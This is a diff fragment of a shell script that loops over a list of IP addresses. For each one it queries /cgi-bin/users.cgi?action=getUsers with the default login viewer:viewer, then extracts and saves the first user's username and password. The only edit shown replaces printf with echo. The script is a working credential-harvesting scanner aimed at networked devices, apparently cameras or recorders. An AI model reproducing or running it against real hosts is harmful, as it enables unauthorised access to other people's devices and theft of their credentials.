@@ -12,6 +12,6 @@ while IFS='' read -r ip || [[ -n "$ip" ]]; do
     printf $ip"\n" >> $OUTPUT 2>&1
     curl -s --max-time 3 http://$ip/cgi-bin/users.cgi?action=getUsers -u viewer:viewer | grep -E '(User1.username|User1.password)' | grep \
     -o -E '(userna.*|passwo.*)' >> $OUTPUT 2>&1
-    printf "\n" >> $OUTPUT 2>&1
+    echo "\n" >> $OUTPUT 2>&1
     done < "$INPUT"
 printf "\nDONE! Saved to $OUTPUT!\n"
